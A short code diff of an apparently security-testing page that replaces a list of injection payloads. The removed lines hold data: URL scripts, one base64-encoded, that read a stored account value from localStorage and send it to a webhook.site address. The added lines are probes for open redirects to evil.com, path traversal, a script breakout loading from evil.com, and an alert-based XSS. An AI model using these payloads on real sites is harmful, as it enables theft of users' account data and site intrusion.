@@ -9,8 +9,12 @@
 
     <script>
       const payloads = [
-        "data:text/html,<script>fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data='+encodeURIComponent(localStorage.getItem('account1')))</script>",
-        "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvOTJmYjliODAtOWMyOC00YjQ3LWEwNWYtZGE2MGU1ZTcyY2E0P2RhdGE9JyArIGVuY29kZVVSSUNvbXBvbmVudChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYWNjb3VudDEnKSkpPC9zY3JpcHQ+"
+        "https://evil.com",
+        "//evil.com",
+        "../../../debug",
+        "tg://resolve?domain=wallet",
+        "</script><script src='https://evil.com'></script>",
+        "data:text/html,<script>alert(document.domain)</script>"
       ];
 
       let index = 0;
